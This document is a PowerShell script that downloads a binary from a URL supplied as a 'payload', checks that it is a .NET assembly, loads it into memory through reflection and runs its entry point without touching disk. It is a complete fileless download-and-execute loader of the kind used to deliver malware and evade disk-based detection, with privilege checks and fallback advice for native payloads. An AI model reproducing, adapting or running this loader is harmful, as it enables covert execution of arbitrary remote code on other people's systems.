param ( [string]$Payload )

# Function to download and execute a .NET binary in memory using reflection
function Execute-DotNetBinaryInMemory {
    param ( [string]$Url )
    try {
        Write-Output "Attempting to download binary from $Url"
        # Download the binary into memory as a byte array
        $webClient = New-Object System.Net.WebClient
        $binaryData = $webClient.DownloadData($Url)
        Write-Output "Downloaded $($binaryData.Length) bytes from $Url"

        # Check if the binary is likely a .NET assembly by inspecting the PE header
        # .NET assemblies have a specific signature in the PE header (COM Directory Table)
        if ($binaryData.Length -lt 128) {
            Write-Error "Binary is too small to be a valid executable."
            return $false
        }

        # Read the MZ signature (first 2 bytes should be 0x4D 0x5A for PE files)
        if ($binaryData[0] -ne 0x4D -or $binaryData[1] -ne 0x5A) {
            Write-Error "Binary does not appear to be a valid PE executable (missing MZ signature)."
            return $false
        }

        # Read the PE header offset (at position 0x3C, little-endian dword)
        $peOffset = [BitConverter]::ToInt32($binaryData, 0x3C)
        if ($peOffset -lt 0 -or $peOffset -gt $binaryData.Length - 24) {
            Write-Error "Invalid PE header offset."
            return $false
        }

        # Check PE signature (should be 0x50 0x45 0x00 0x00)
        if ($binaryData[$peOffset] -ne 0x50 -or $binaryData[$peOffset+1] -ne 0x45 -or $binaryData[$peOffset+2] -ne 0x00 -or $binaryData[$peOffset+3] -ne 0x00) {
            Write-Error "Binary does not have a valid PE signature."
            return $false
        }

        # Check for .NET metadata (COM Directory Table at Optional Header + 0xE0 for PE32, 0xF0 for PE32+)
        # First, check if it's PE32 or PE32+ (at PE header + 0x18, magic number)
        $magic = [BitConverter]::ToUInt16($binaryData, $peOffset + 0x18)
        $comDirOffset = $peOffset + (if ($magic -eq 0x10B) { 0xE0 } else { 0xF0 })
        if ($comDirOffset + 8 -gt $binaryData.Length) {
            Write-Error "Binary header is too short to contain COM Directory Table."
            return $false
        }

        $comDirRva = [BitConverter]::ToUInt32($binaryData, $comDirOffset)
        if ($comDirRva -eq 0) {
            Write-Error "Binary does not appear to be a .NET assembly (no COM Directory Table). Cannot execute unmanaged binaries filelessly in PowerShell without native API calls."
            Write-Output "As a fallback, consider using a different tool or language (e.g., C# executable) for native binary execution."
            return $false
        }

        Write-Output "Binary appears to be a .NET assembly. Attempting in-memory execution via reflection."

        # Load the assembly into memory
        $assembly = [System.Reflection.Assembly]::Load($binaryData)
        if (-not $assembly) {
            Write-Error "Failed to load the assembly into memory."
            return $false
        }
        Write-Output "Assembly loaded into memory successfully: $($assembly.FullName)"

        # Find the entry point (Main method)
        $entryPoint = $assembly.EntryPoint
        if (-not $entryPoint) {
            Write-Error "No entry point (Main method) found in the assembly."
            return $false
        }
        Write-Output "Entry point found: $($entryPoint.Name)"

        # Invoke the entry point
        Write-Output "Invoking entry point for execution."
        $result = $entryPoint.Invoke($null, @())
        Write-Output "Execution completed. Result: $result"
        return $true
    }
    catch {
        Write-Error "Error executing .NET binary in memory: $_"
        return $false
    }
}

# Main logic to handle the payload
function Exec {
    param ( [string]$Payload )
    Write-Output "Processing payload: $Payload"
    # Check if the payload is a URL (for downloading a binary)
    if ($Payload -match "^https?://") {
        # Attempt to execute as a .NET binary in memory
        $success = Execute-DotNetBinaryInMemory -Url $Payload
        if (-not $success) {
            Write-Output "Fileless execution failed. If the binary is not a .NET assembly, PowerShell cannot execute it filelessly without native API calls, which cause crashes."
            Write-Output "Recommendation: Use a compiled helper in C# or C++ for native binaries, or revert to disk-based execution."
        }
    }
    else {
        Write-Error "Unsupported payload type. Provide a URL to a binary for in-memory execution."
    }
}

# Check if running with elevated privileges (just for informational purposes)
$isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning "Script is not running with elevated privileges. Some operations may fail if additional permissions are required."
}

# Execute the payload passed as an argument
Exec -Payload $Payload
